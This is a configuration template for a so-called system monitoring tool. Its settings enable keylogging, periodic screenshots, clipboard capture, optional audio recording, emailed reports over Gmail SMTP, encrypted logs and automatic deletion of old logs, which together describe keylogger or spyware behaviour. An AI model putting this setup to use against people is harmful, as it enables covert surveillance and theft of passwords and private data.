# System Monitoring Tool Configuration
# IMPORTANT: Rename this file to 'config.ini' and fill in your settings
# DO NOT commit config.ini with real credentials to version control

[Email]
# SMTP server settings for sending reports
smtp_server = smtp.gmail.com
smtp_port = 587
sender_email = your_email@gmail.com
sender_password = your_app_specific_password
receiver_email = receiver@example.com

# Gmail users: Use an App-Specific Password, not your regular password
# Enable 2FA and generate app password at: https://myaccount.google.com/apppasswords

[Intervals]
# Time intervals in seconds for various monitoring tasks
email_interval = 3600
screenshot_interval = 300
clipboard_interval = 60
audio_duration = 30
keystroke_buffer = 10

[Paths]
# Directory paths for storing monitoring data
log_directory = logs
screenshot_directory = screenshots
audio_directory = audio
encryption_key_file = encryption.key

[Features]
# Enable/disable specific monitoring features (true/false)
enable_keylogging = true
enable_screenshots = true
enable_clipboard = true
enable_audio = false
enable_system_info = true

[Security]
# Security settings
encrypt_logs = true
auto_cleanup = true
max_log_age_days = 7
